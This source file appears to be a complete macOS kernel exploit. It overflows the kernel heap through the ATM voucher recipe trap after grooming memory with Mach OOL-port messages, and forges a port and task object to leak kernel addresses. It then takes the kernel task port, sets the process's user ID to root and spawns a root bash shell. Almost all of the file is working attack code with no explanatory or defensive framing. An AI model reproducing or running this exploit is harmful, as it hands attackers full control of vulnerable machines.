#define PORT_COUNT 1024
#define USE_PORT_START 384
#define USE_PORT_HALF 512
#define USE_PORT_END 640
#define IO_BITS_ACTIVE 0x80000000
#define IKOT_CLOCK 25
#define IKOT_TASK 2
#define lck_spin_t char
#define TASK_GAP_IN_PROC 24
#define CR_RUID_GAP_IN_UCRED 24
#define TASK_GAP_IN_IPC_OBJ 104
#define ITK_KERN_SSELF_GAP_IN_TASK 232
#define UCRED_GAP_IN_PROCESS 232
#define TASK_INFO_GAP 896

#import <stdio.h>
#import <stdlib.h>
#import <mach/mach.h>
#import <atm/atm_types.h>
#import <sys/mman.h>

/* FROM osfmk/ipc/ipc_object.h -*/
typedef natural_t ipc_object_bits_t;
typedef natural_t ipc_object_refs_t;

typedef struct _ipc_object{ 
	ipc_object_bits_t io_bits;
	ipc_object_refs_t io_references;
	lck_spin_t io_lock_data[1024];
}ipc_object;
/* ----------------------------*/

typedef struct _dumpdata{
	char* dump_port;
	char* dump_task;
	uint64_t dump_itk_kern_sself;
}dumpdata;

struct ool_send_msg{
	mach_msg_header_t msg_head;
	mach_msg_body_t msg_body;
	mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
};

struct ool_recv_msg{
	mach_msg_header_t msg_head;
	mach_msg_body_t msg_body;
	mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
	mach_msg_trailer_t msg_trailer;
};

struct ool_send_msg send_msg;
struct ool_recv_msg recv_msg;
mach_port_t* ool_port_fengshui(){
	int current_port_num = 0;
	mach_port_t* ool_ports;
	ool_ports = calloc(PORT_COUNT, sizeof(mach_port_t));

	// Part 1. Create OOL Ports
	for(current_port_num = 0; current_port_num < PORT_COUNT; current_port_num++){ // Alloc 1024 Ports
		mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ool_ports[current_port_num]); // Alloc Port(创建指定类型的端口)
		mach_port_insert_right(mach_task_self(), ool_ports[current_port_num], ool_ports[current_port_num], MACH_MSG_TYPE_MAKE_SEND); // MACH_MSG_TYPE_MAKE_SEND Right Set.
	}																																 // 授予进程端口权限(发送)

	// Part 2. Create Message Buffer (Spray)
	mach_port_t* use_ports = calloc(1024, sizeof(mach_port_t));

	for(int i = 0; i <= 1024; i++){
		use_ports[i] = MACH_PORT_DEAD;
	}

	/* Set MSG HEADER */
	send_msg.msg_head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
	send_msg.msg_head.msgh_size = sizeof(struct ool_send_msg) - 16;
	send_msg.msg_head.msgh_remote_port = MACH_PORT_NULL;
	send_msg.msg_head.msgh_local_port = MACH_PORT_NULL; // NULL SEND
	send_msg.msg_head.msgh_reserved = 0x00;
	send_msg.msg_head.msgh_id = 0x00;
	
	/* SET MSG BODY */
	send_msg.msg_body.msgh_descriptor_count = 1;
	
	/* SET MSG OOL PORT DESCRIPTOR */
	for(int i = 0; i<=16; i++){ // appropriate ipc-send size  
		send_msg.msg_ool_ports[i].address = use_ports;
		send_msg.msg_ool_ports[i].count = 32; // kalloc 0x100 (256)
		send_msg.msg_ool_ports[i].deallocate = 0x00;
		send_msg.msg_ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
		send_msg.msg_ool_ports[i].disposition = MACH_MSG_TYPE_MAKE_SEND;
		send_msg.msg_ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
	}

	// Part 3. Message Fengshui
	/* SEND MSG */
	for(current_port_num = 0; current_port_num < USE_PORT_START; current_port_num++){
		send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
		kern_return_t send_result = mach_msg(&send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
		if(send_result != KERN_SUCCESS){
			printf("[-] Error in OOL Fengshui send\nError : %s\n", mach_error_string(send_result));
			exit(1);
		}
	}

	for(current_port_num = USE_PORT_END; current_port_num < PORT_COUNT; current_port_num++){
		send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
		kern_return_t send_result = mach_msg(&send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
		if(send_result != KERN_SUCCESS){
			printf("[-] Error in OOL Fengshui send\nError : %s\n", mach_error_string(send_result));
			exit(1);
		}
	}

	for(current_port_num = USE_PORT_START; current_port_num < USE_PORT_END; current_port_num++){
		send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
		kern_return_t send_result = mach_msg(&send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
		if(send_result != KERN_SUCCESS){
			printf("[-] Error in OOL Fengshui send\nError : %s\n", mach_error_string(send_result));
			exit(1);
		}
	}

	/* RECV MSG */
	for(current_port_num = USE_PORT_START; current_port_num < USE_PORT_END; current_port_num += 4){
		recv_msg.msg_head.msgh_local_port = ool_ports[current_port_num];
		kern_return_t recv_result = mach_msg(&recv_msg.msg_head, MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 0, sizeof(struct ool_recv_msg), ool_ports[current_port_num], MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
		if(recv_result != KERN_SUCCESS){
			printf("[-] Error in OOL Fengshui recv\nError : %s\n", mach_error_string(recv_result));
			exit(1);
		}
	}

	/* RE-SEND MSG */
	for(current_port_num = USE_PORT_START; current_port_num < USE_PORT_HALF; current_port_num += 4){
		send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
		kern_return_t send_result = mach_msg(&send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
		if(send_result != KERN_SUCCESS){
			printf("[-] Error in OOL Fengshui re-send\nError : %s\n", mach_error_string(send_result));
			exit(1);
		}
	}
	
	printf("[+] OOL Port Fengshui Success\n");
	return ool_ports;
}

/* ---- FROM Crash PoC ---- */
uint64_t map(uint64_t size) {
	uint64_t _addr = 0x00;
	kern_return_t err = mach_vm_allocate(mach_task_self(), &_addr, size, VM_FLAGS_ANYWHERE);
	if (err != KERN_SUCCESS) {
		printf("failed to allocate fixed mapping: %s\n", mach_error_string(err));
		exit(EXIT_FAILURE);
	}
	return _addr;
}
/* ----------------- */

/* ---- FROM exp.m ---- */
uint64_t roundup(uint64_t val, uint64_t pagesize) {
	val += pagesize - 1;
	val &= ~(pagesize - 1);
	return val;
}
void heap_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overflow_data, mach_port_t* voucher_port) {
	
	int pagesize = getpagesize();

	void* recipe_size = (void*)map(pagesize);
	*(uint64_t*)recipe_size = kalloc_size;

	uint64_t actual_copy_size = kalloc_size + overflow_length;
	uint64_t alloc_size = roundup(actual_copy_size, pagesize) + pagesize;
    uint64_t base = map(alloc_size); // unmap page
    
    uint64_t end = base + roundup(actual_copy_size, pagesize);
    mach_vm_deallocate(mach_task_self(), end, pagesize); // for copyin() stop
    
    uint64_t start = end - actual_copy_size;
    
    uint8_t* recipe = (uint8_t*)start;
    
    memset(recipe, 0x41, kalloc_size); // set kalloc size
    memcpy(recipe + kalloc_size, overflow_data, overflow_length); // set overflow bytes
    
    kern_return_t err = mach_voucher_extract_attr_recipe_trap(voucher_port, 1, recipe, recipe_size); // Trigger

}

/* -------------------- */

mach_port_t* find_manipulation_port(mach_port_t* port_list){
	for(int i = 0; i < USE_PORT_END; i++){
		send_msg.msg_head.msgh_local_port = port_list[i];
		kern_return_t send_result = mach_msg(&send_msg.msg_head, MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 0, sizeof(struct ool_send_msg), port_list[i], MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
		for(int k = 0; k < send_msg.msg_body.msgh_descriptor_count; k++){ // traversing ool descriptors
			mach_port_t* tmp_port = send_msg.msg_ool_ports[k].address;
			if(tmp_port[0] != MACH_PORT_DEAD && tmp_port[0] != NULL){ // is Manipulated? (compare 8 bytes is enough. cuz of 8 bytes overflow)
				printf("[+] Found manipulated port! %dth port : %dth descriptor => %llx\n", i, k, tmp_port[0]);
				return tmp_port[0];
			}
		}

	}

	printf("[-] Error in Find Manipulated Port\n");
	exit(1);
}

uint64_t get_clock_list_addr(uint64_t fake_port, mach_port_t* manipulated_port){
	for(uint64_t guess_clock_addr = 0xffffff8000200000; guess_clock_addr < 0xffffff80F0200000; guess_clock_addr++){
		*(uint64_t *)(fake_port + TASK_GAP_IN_IPC_OBJ) = guess_clock_addr; // Traverse address
		*(uint64_t *)(fake_port + 0xa0) = 0xff; 

		if(clock_sleep_trap(manipulated_port, 0, 0, 0, 0) == KERN_SUCCESS){
			printf("[+] found clock_list addr : %llx\n", guess_clock_addr);
			return (guess_clock_addr);
		}
	}
	printf("[-] Find clock_list addr failed.\n");
	exit(1);
}

uint64_t get_kernel_addr(uint64_t fake_port, void* fake_task, uint64_t clock_list_addr, mach_port_t* manipulated_port){
	*(uint64_t*) (fake_port + TASK_GAP_IN_IPC_OBJ) = fake_task;
    *(uint64_t*) (fake_port + 0xa0) = 0xff; 
    *(uint64_t*) (fake_task + 0x10) = 0x01;  

    clock_list_addr &= ~(0x3FFF);

    for(uint64_t current_addr = clock_list_addr; current_addr > 0xffffff8000200000; current_addr-=0x4000) {
    	int32_t kernel_data = 0;
    	*(uint64_t*) (fake_task + TASK_INFO_GAP) = current_addr - 0x10;
    	pid_for_task(manipulated_port, &kernel_data);
    	if (kernel_data == 0xfeedfacf) {
    		printf("[+] Found kernel_text addr : %llx\n", current_addr);
    		return current_addr;
    	}
    }
}

uint64_t get_proc_addr(uint64_t pid, uint64_t kernel_addr, void* fake_task, mach_port_t* manipulated_port){
	uint64_t allproc_real_addr = 0xffffff8000ABB490 - 0xffffff8000200000 + kernel_addr;
	
	uint64_t pCurrent = allproc_real_addr;
	uint64_t pNext = pCurrent;
	while (pCurrent != NULL) {
		int nPID = 0;    
		*(uint64_t*) (fake_task + TASK_INFO_GAP) = pCurrent;
		pid_for_task(manipulated_port, (int32_t*)&nPID);
		if (nPID == pid) {
			return pCurrent;
		}
		else{
			*(uint64_t*) (fake_task + TASK_INFO_GAP) = pCurrent - 0x10;
			pid_for_task(manipulated_port, (int32_t*)&pNext);
			*(uint64_t*) (fake_task + TASK_INFO_GAP) = pCurrent - 0x0C;
			pid_for_task(manipulated_port, (int32_t*)(((uint64_t)(&pNext)) + 4));
			pCurrent = pNext;
		}
	}

}

dumpdata* get_kernel_priv(uint64_t kernel_process, uint64_t* fake_port, void* fake_task, mach_port_t* manipulated_port){
	dumpdata* data = (dumpdata *)malloc(sizeof(dumpdata));
	data->dump_port = malloc(0x1000);
	data->dump_task = malloc(0x1000);

	uint64_t kern_task = 0;
	*(uint64_t*) (fake_task + TASK_INFO_GAP) = (kernel_process + 0x18) - 0x10 ;
	pid_for_task(manipulated_port, (int32_t*)&kern_task);
	*(uint64_t*) (fake_task + TASK_INFO_GAP) = (kernel_process + 0x1C) - 0x10;
	pid_for_task(manipulated_port, (int32_t*)(((uint64_t)(&kern_task)) + 4));

	uint64_t itk_kern_sself = 0;
	*(uint64_t*) (fake_task + TASK_INFO_GAP) = (kern_task + ITK_KERN_SSELF_GAP_IN_TASK) - 0x10;
	pid_for_task(manipulated_port, (int32_t*)&itk_kern_sself);
	*(uint64_t*) (fake_task + TASK_INFO_GAP) = (kern_task + ITK_KERN_SSELF_GAP_IN_TASK + 4) - 0x10;
	pid_for_task(manipulated_port, (int32_t*)(((uint64_t)(&itk_kern_sself)) + 4));
	data->dump_itk_kern_sself = itk_kern_sself;

	for (int i = 0; i < 256; i++) {
		*(uint64_t*) (fake_task + TASK_INFO_GAP) = (itk_kern_sself + i*4) - 0x10;
		pid_for_task(manipulated_port, (int32_t*)(data->dump_port + (i*4)));
	}
	for (int i = 0; i < 256; i++) {
		*(uint64_t*) (fake_task + TASK_INFO_GAP) = (kern_task + i*4) - 0x10;
		pid_for_task(manipulated_port, (int32_t*)(data->dump_task + (i*4)));
	}
	return data;
}

void main(void){
	// Create OOL Ports [Fengshui]
	mach_port_t* created_ports = ool_port_fengshui();

	// Create ATM Voucher & fakeport => ipc_object [Overflow ready]
	mach_port_t* voucher_port = MACH_PORT_NULL;
	mach_voucher_attr_recipe_data_t atm_data = {
		.key = MACH_VOUCHER_ATTR_KEY_ATM,
		.command = MACH_VOUCHER_ATTR_ATM_CREATE
	};
	kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &voucher_port);

	ipc_object* fake_port = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); // alloc fake_port
	void* fake_task = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); // alloc fake_task
	fake_port->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK; // for clock trap
	fake_port->io_lock_data[12] = 0x11;
	printf("[+] Create Fake Port. Address : %llx\n", (unsigned long long)fake_port);
	
	// Overflow Trigger
	heap_overflow(0x100, 0x8, (unsigned char *)&fake_port, voucher_port);
	
	// Find manipulated port
	mach_port_t* manipulated_port = find_manipulation_port(created_ports);

	// Leak Kernel Address using system clock trap => clock_list
	uint64_t clock_list = get_clock_list_addr((uint64_t) fake_port, manipulated_port);
	fake_port->io_bits = IO_BITS_ACTIVE | IKOT_TASK; // for task trap
	fake_port->io_references = 0x01; // [osfmk/ipc/ipc_object.c] (cuz of, assert(object->ioreferences > 0) pass) 
	uint64_t kernel_addr = get_kernel_addr((uint64_t) fake_port, fake_task, clock_list, manipulated_port);

	// Get my process and kernel process
	uint64_t current_process = get_proc_addr(getpid(), kernel_addr, fake_task, manipulated_port); 
	printf("[+] Found current process addr : %llx\n", current_process);
	uint64_t kernel_process = get_proc_addr(0, kernel_addr, fake_task, manipulated_port);
	printf("[+] Found kernel addr : %llx\n", kernel_process);
// Kernel AAR/AAW => kernel taskport & kernel port right
	dumpdata* data = get_kernel_priv(kernel_process, &fake_port, fake_task, manipulated_port);
	memcpy(fake_port, data->dump_port, 0x1000);
	memcpy(fake_task, data->dump_task, 0x1000);
	*(uint64_t*)(((uint64_t)fake_port) + TASK_GAP_IN_IPC_OBJ) = fake_task;
	*(uint64_t*)(((uint64_t)fake_port) + 0xa0) = 0xff; 
	*(uint64_t*)(((uint64_t)fake_task) + 0x2b8) = data->dump_itk_kern_sself;
	mach_port_t kernel_port;
	task_get_special_port(manipulated_port, 4, &kernel_port);
	
	// Privilege Esccalation
	uint64_t cred;
	mach_vm_size_t read_bytes = 8;
	mach_vm_read_overwrite(kernel_port, (current_process + UCRED_GAP_IN_PROCESS), (size_t)8, (mach_vm_offset_t)(&cred), &read_bytes); // AAR in Kernel
	vm_offset_t root_uid = 0;
	mach_msg_type_number_t write_bytes = 8;
	mach_vm_write(kernel_port, (cred + CR_RUID_GAP_IN_UCRED), &root_uid, (mach_msg_type_number_t)write_bytes); // AAW in Kernel
    system("/bin/bash"); // Get Shell
    
}